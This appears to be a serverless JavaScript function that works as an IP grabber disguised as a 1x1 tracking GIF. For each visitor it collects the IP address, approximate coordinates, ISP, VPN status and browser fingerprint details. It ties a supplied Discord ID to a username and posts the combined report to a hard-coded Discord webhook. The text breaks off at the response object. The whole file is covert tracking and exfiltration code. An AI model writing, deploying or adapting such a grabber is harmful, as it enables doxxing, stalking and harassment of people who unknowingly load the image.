exports.handler = async (event) => {
    const ip = event.headers['x-nf-client-connection-ip'] || 'unknown';
    const ua = event.headers['user-agent'] || 'unknown';
    const referer = event.headers['referer'] || 'Direct';
    const timestamp = new Date().toISOString();

    // Parse browser info
    let browserInfo = {};
    let discordId = null;
    try {
        if (event.body) {
            const body = JSON.parse(event.body);
            browserInfo = body.browserInfo || {};
            discordId = browserInfo.discordId || null;
        }
    } catch(e) {}

    // Try to resolve Discord ID to username
    let discordUsername = null;
    if (discordId && discordId !== 'not provided' && discordId !== '000000000000000000') {
        try {
            // Requires a Discord Bot token — create one at https://discord.com/developers/applications
            const BOT_TOKEN = 'YOUR_DISCORD_BOT_TOKEN'; // <-- Replace this
            const resp = await fetch(`https://discord.com/api/v10/users/${discordId}`, {
                headers: { 'Authorization': `Bot ${BOT_TOKEN}` }
            });
            if (resp.ok) {
                const user = await resp.json();
                discordUsername = `${user.username}#${user.discriminator}`;
                if (user.global_name) discordUsername += ` (${user.global_name})`;
            } else {
                discordUsername = 'Could not resolve (invalid ID or bot cannot see user)';
            }
        } catch (err) {
            discordUsername = 'Lookup failed';
        }
    }

    // Geolocation + VPN detection
    let isVPN = false;
    let isProxy = false;
    let isDatacenter = false;
    let country = 'Unknown';
    let city = 'Unknown';
    let region = 'Unknown';
    let isp = 'Unknown';
    let org = 'Unknown';
    let asn = 'Unknown';
    let lat = '';
    let lon = '';
    let timezone = 'Unknown';
    let mobile = false;

    try {
        const resp = await fetch(`http://ip-api.com/json/${ip}?fields=proxy,hosting,country,city,regionName,isp,org,as,lat,lon,timezone,mobile,query`);
        const data = await resp.json();
        isVPN = data.proxy === true || data.hosting === true;
        isProxy = data.proxy === true;
        isDatacenter = data.hosting === true;
        country = data.country || 'Unknown';
        city = data.city || 'Unknown';
        region = data.regionName || 'Unknown';
        isp = data.isp || 'Unknown';
        org = data.org || 'Unknown';
        asn = data.as || 'Unknown';
        lat = data.lat || '';
        lon = data.lon || '';
        timezone = data.timezone || 'Unknown';
        mobile = data.mobile === true;
    } catch (err) {
        console.error('IP lookup failed', err);
    }

    const vpnStatus = isVPN ? '🚨 YES' : '✅ No';
    const vpnDetail = isDatacenter ? ' (Datacenter IP)' : isProxy ? ' (Proxy)' : ' (Residential)';

    let message = `**🔍 TigerLegit Visitor Report**\n` +
                  `━━━━━━━━━━━━━━━━━━\n`;

    // If we have Discord info, show it prominently
    if (discordId && discordId !== 'not provided' && discordId !== '000000000000000000') {
        message += `**👤 Discord User:** ${discordUsername || `ID: ${discordId} (no bot token configured)`}\n`;
        if (discordUsername) {
            message += `**🆔 Discord ID:** \`${discordId}\`\n`;
        }
        message +='━━━━━━━━━━━━━━━━━━\n';
    }

    message += `**🌐 IP:** \`${ip}\`\n` +
               `**🛡️ VPN/Proxy:** ${vpnStatus}${vpnDetail}\n` +
               `**📍 Location:** ${city}, ${region}, ${country}\n` +
               `**📌 Coordinates:** ${lat}, ${lon}\n` +
               `**⏰ Timezone:** ${timezone}\n` +
               `**🏢 ISP:** ${isp}\n` +
               `**🏭 Org:** ${org}\n` +
               `**🔢 ASN:** ${asn}\n` +
               `**📱 Mobile:** ${mobile ? 'Yes' : 'No'}\n` +
               `**🖥️ Screen:** ${browserInfo.screen || 'Unknown'}\n` +
               `**📱 Viewport:** ${browserInfo.viewport || 'Unknown'}\n` +
               `**💻 Platform:** ${browserInfo.platform || 'Unknown'}\n` +
               `**🧠 CPU Cores:** ${browserInfo.cores || 'Unknown'}\n` +
               `**💾 RAM:** ${browserInfo.memory || 'Unknown'}\n` +
               `**🎮 GPU:** ${browserInfo.gpu || 'Unknown'}\n` +
               `**🌍 Language:** ${browserInfo.language || 'Unknown'}\n` +
               `**🔌 Connection:** ${browserInfo.connectionType || 'Unknown'}\n` +
               `**🔋 Battery:** ${browserInfo.batteryLevel || 'Unknown'} ${browserInfo.batteryCharging ? '(Charging)' : ''}\n` +
               `**🍪 Cookies:** ${browserInfo.cookiesEnabled ? 'Enabled' : 'Disabled'}\n` +
               `**📌 DNT:** ${browserInfo.doNotTrack || 'Unspecified'}\n` +
               `**🕐 Local Time:** ${browserInfo.localTime || 'Unknown'}\n` +
               `**🔗 Referrer:** ${referer}\n` +
               `**🖥️ UA:** \`${ua.substring(0, 120)}\``;

    try {
        await fetch('https://discord.com/api/webhooks/1525619686434279564/4WcjQ1_nAdgsHQtMRAXaww-wPg4vOwglWFwf3oTes7DpODl7I3sG1g129Vq1xr9_UNFZ', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message.substring(0, 2000) })
        });
    } catch (err) {
        console.error('Webhook failed', err);
    }

    return {
        statusCode: 200,
        headers: { 'Content-Type': 'image/gif' },
        body: 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
        isBase64Encoded: true
